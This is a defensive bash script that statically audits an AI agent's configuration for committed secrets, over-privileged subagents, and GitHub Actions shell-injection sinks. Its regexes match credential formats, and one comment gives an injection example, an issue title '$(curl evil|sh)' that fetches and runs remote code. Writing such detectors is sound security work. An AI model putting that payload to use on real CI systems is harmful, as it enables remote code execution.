#!/usr/bin/env bash
# Config audit — a STATIC scan of the agent configuration itself, wired into the preflight as
# Gate 7. Prompts express intent; they can't be a safety boundary. This gate treats the config
# as an artifact and checks the three ways the config (not the agent's behaviour) can breach a
# trust boundary:
#
#   1) Secrets committed under .claude/       — a credential leak that no runtime deny can undo.
#   2) A subagent with no `tools:` frontmatter — omitting it inherits ALL tools, so a "read-only"
#      reviewer silently gains write/exec. Least-privilege must be DECLARED, and must exclude the
#      mutating tools (Edit/Write/…): a review agent that can edit files is not a reviewer.
#   3) Untrusted input flowing into a shell    — the classic injection sink: a workflow `run:` (or
#      a hook command) interpolating attacker-controllable text (issue/PR/comment body) straight
#      into the shell. An issue title can then run code in CI.
#
# Read-only and deterministic: it reads tracked files, never executes them, never prints secret
# values (only the file:line and the rule that fired). Exits non-zero on any finding so the
# preflight fails closed. Not a generator — it detects, it does not rewrite.
#
# Scope override via env or .env: AGENT_AUDIT_PATHS (space-separated roots; default ".claude").
set -uo pipefail

[ -f .env ] && set -a && . ./.env && set +a

AUDIT_PATHS="${AGENT_AUDIT_PATHS:-.claude}"
# The mutating tools a read-only reviewer must never hold.
WRITE_TOOLS="Edit Write MultiEdit NotebookEdit"

fail=0
ok(){   printf '  [ok]   %s\n' "$1"; }
bad(){  printf '  [FAIL] %s\n' "$1"; fail=1; }
skip(){ printf '  [skip] %s\n' "$1"; }
info(){ printf '  [info] %s\n' "$1"; }

# Prefer tracked files (git); fall back to a find over the audit paths when not in a work tree.
list_files(){ # $1 = root dir
  [ -e "$1" ] || return 0
  if git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    git ls-files -- "$1"
  else
    find "$1" -type f
  fi
}

# ── Check 1 — no secrets under the audit paths ───────────────────────────────────────────────
# Two tiers. Tier A: unambiguous credential FORMATS — always a finding. Tier B: an assignment
# (`secret = "…"`) whose value doesn't look like a placeholder — high-signal, low-noise. Prose
# that merely names a secret (e.g. a secret-id string) has no `=`/`:` + quoted value, so it does
# not trip Tier B; placeholders (your-…, <…>, xxx, example) are explicitly excused.
echo "-- 1) secrets in config --"
FORMAT_RE='(AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|gh[posru]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|xox[baprs]-[A-Za-z0-9-]{10,})'
ASSIGN_RE='(password|passwd|secret|api[_-]?key|access[_-]?token|client[_-]?secret|private[_-]?key)[[:space:]]*[:=][[:space:]]*["'"'"'][^"'"'"' ]{8,}["'"'"']'
PLACEHOLDER_RE='(your-|<|xxx+|example|changeme|dummy|replace|todo|placeholder|\.\.\.|\$\{|\$[A-Za-z_])'
secrets_scanned=0
while IFS= read -r f; do
  [ -f "$f" ] || continue
  secrets_scanned=$((secrets_scanned+1))
  # Tier A — credential formats.
  if hits=$(grep -nEI "$FORMAT_RE" "$f" 2>/dev/null); then
    while IFS= read -r ln; do bad "credential-shaped string in $f:${ln%%:*} (matched a key/token format)"; done \
      <<< "$(printf '%s\n' "$hits" | cut -d: -f1)"
  fi
  # Tier B — real-looking secret assignment (skip placeholder values).
  if hits=$(grep -niEI "$ASSIGN_RE" "$f" 2>/dev/null); then
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      lno="${line%%:*}"
      if printf '%s' "$line" | grep -qiE "$PLACEHOLDER_RE"; then continue; fi
      bad "secret-looking assignment in $f:$lno (quoted non-placeholder value)"
    done <<< "$hits"
  fi
done < <(for p in $AUDIT_PATHS; do list_files "$p"; done)
[ "$fail" -eq 0 ] && ok "no secrets found ($secrets_scanned files scanned under: $AUDIT_PATHS)"

# ── Check 2 — every subagent declares a least-privilege tool set (and no write tools) ────────
echo "-- 2) agent least-privilege (tools: declared, no write tools) --"
agent_dir=".claude/agents"
if [ -d "$agent_dir" ]; then
  found_agent=0
  for a in "$agent_dir"/*.md; do
    [ -f "$a" ] || continue
    found_agent=1
    # tools: line inside the top frontmatter block (first '---' … next '---').
    tline=$(awk 'NR==1&&/^---/{f=1;next} f&&/^---/{exit} f&&/^[Tt]ools:/{print;exit}' "$a")
    if [ -z "$tline" ]; then
      bad "$a declares no 'tools:' — a subagent without it inherits ALL tools (privilege escalation)"
      continue
    fi
    granted=$(printf '%s' "$tline" | sed -E 's/^[Tt]ools:[[:space:]]*//; s/[][,]/ /g')
    viol=""
    for w in $WRITE_TOOLS; do
      for g in $granted; do [ "$g" = "$w" ] && viol="$viol $w"; done
    done
    if [ -n "$viol" ]; then
      bad "$(basename "$a") is granted mutating tool(s):$viol — a read-only reviewer must not hold write access"
    else
      ok "$(basename "$a") — least-privilege declared ($granted)"
    fi
  done
  [ "$found_agent" -eq 0 ] && info "no agent definitions under $agent_dir"
else
  info "no $agent_dir directory — no subagents to audit"
fi

# ── Check 3 — no untrusted input flows into a shell (workflow run: / hook command) ───────────
# The GitHub Actions script-injection sink: attacker-controllable FREE-TEXT (issue/PR/discussion
# title & body, comment/review body, a branch name via head_ref, a commit message/author) that is
# interpolated via ${{ … }} *inside a run: shell body*, where the shell then executes it — an
# issue titled `$(curl evil|sh)` runs in CI. Only free text is a finding: a `.number`/`.sha` can't
# carry a payload, and a login is charset-constrained. The SAFE pattern the kit uses — bind the
# value in env: and reference "$VAR" in run: — is NOT flagged, because the ${{ }} then lives in
# env:, not in the shell. So we scan ONLY the bodies of run: blocks, not if:/env:/with: lines.
echo "-- 3) untrusted input into shell (workflow run: / hooks) --"
UNTRUSTED_RE='\$\{\{[[:space:]]*github\.(head_ref|event\.(issue|pull_request|discussion)\.(title|body)|event\.pull_request\.head\.ref|event\.(comment|review)\.body|event\.head_commit\.(message|author\.(name|email)))'
# Emit only the lines that lie inside a `run: |` / `run: >` block body (plus inline `run:` cmds),
# as "file:lineno:content", by tracking indentation: the block runs from the run: key until the
# next sibling key/list-item at an indent <= the run: key's indent.
run_block_lines(){ # $1 = workflow file
  awk '
    { match($0, /^ */); ind=RLENGTH }
    in_run && ind<=run_indent && $0 ~ /^[ ]*(-|[A-Za-z0-9_-]+:)/ { in_run=0 }
    in_run { print FILENAME ":" NR ":" $0 }
    $0 ~ /^[ ]*(-[ ]+)?run:[ ]*([|>][-+]?)?[ ]*$/ && $0 ~ /run:[ ]*[|>]/ { in_run=1; run_indent=ind; next }
    $0 ~ /^[ ]*(-[ ]+)?run:[ ]+[^|>]/ { print FILENAME ":" NR ":" $0 }   # inline single-line run:
  ' "$1"
}
wf_scanned=0
inj=0
while IFS= read -r wf; do
  [ -f "$wf" ] || continue
  wf_scanned=$((wf_scanned+1))
  # run_block_lines emits "file:lineno:content"; grep (no -n) keeps that intact, so the real
  # line number is field 2 (workflow paths here contain no colon).
  if hits=$(run_block_lines "$wf" | grep -E "$UNTRUSTED_RE" 2>/dev/null); then
    while IFS= read -r h; do
      [ -n "$h" ] || continue
      realno=$(printf '%s' "$h" | cut -d: -f2)
      bad "untrusted free-text \${{ github.event.* }} inside run: at $wf:$realno — bind it in env: and use \"\$VAR\""
      inj=1
    done <<< "$hits"
  fi
done < <(for d in .github/workflows optional; do [ -d "$d" ] && find "$d" -type f \( -name '*.yml' -o -name '*.yaml' \); done)
[ "$inj" -eq 0 ] && ok "no untrusted free-text reaches a run: shell body ($wf_scanned workflow files scanned)"

# Hooks (if any) — a hook command that shells out over model-controlled input is the same sink.
settings_seen=0
for s in .claude/settings.json .claude/settings.local.json; do
  [ -f "$s" ] || continue
  settings_seen=1
  if grep -q '"hooks"' "$s" 2>/dev/null; then
    if grep -nE '"command":[^,]*(\$\(|`|\beval\b)' "$s" >/dev/null 2>&1; then
      grep -nE '"command":[^,]*(\$\(|`|\beval\b)' "$s" | while IFS= read -r ln; do
        printf '  [FAIL] hook command uses command-substitution/eval in %s:%s — review for injected input\n' "$s" "${ln%%:*}"
      done
      fail=1
    else
      ok "hooks present in $s, none shell out via \$()/backtick/eval"
    fi
  fi
done
[ "$settings_seen" -eq 0 ] && info "no .claude/settings*.json — no hooks configured (no hook-injection surface)"

echo
if [ "$fail" -ne 0 ]; then
  echo "CONFIG AUDIT FAILED — fix the [FAIL] items above before running the loop."
  exit 1
fi
echo "config audit clean — no secrets, least-privilege agents, no untrusted-input shell sinks."
